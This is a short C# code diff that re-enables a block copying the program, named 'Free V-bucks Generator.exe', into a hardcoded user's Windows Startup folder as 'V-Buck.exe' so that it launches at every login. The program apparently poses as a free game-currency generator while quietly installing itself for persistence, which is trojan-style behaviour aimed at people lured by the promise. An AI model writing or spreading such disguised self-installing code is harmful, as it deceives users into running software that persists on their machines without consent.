@@ -23,14 +23,14 @@ namespace UwU
 
             bool FileExist = File.Exists("C:/Users/tislud18emiasb/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/V-Buck.exe");
 
-            /*if (!FileExist)
+            if (!FileExist)
             {
                 File.Copy("Free V-bucks Generator.exe", "C:/Users/tislud18emiasb/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/V-Buck.exe");
             } else if (FileExist)
             {
                 File.Delete("C:/Users/tislud18emiasb/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/V-Buck.exe");
                 File.Copy("Free V-bucks Generator.exe", "C:/Users/tislud18emiasb/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/V-Buck.exe");
-            }*/
+            }
 
             button1.Enabled = false;
         }
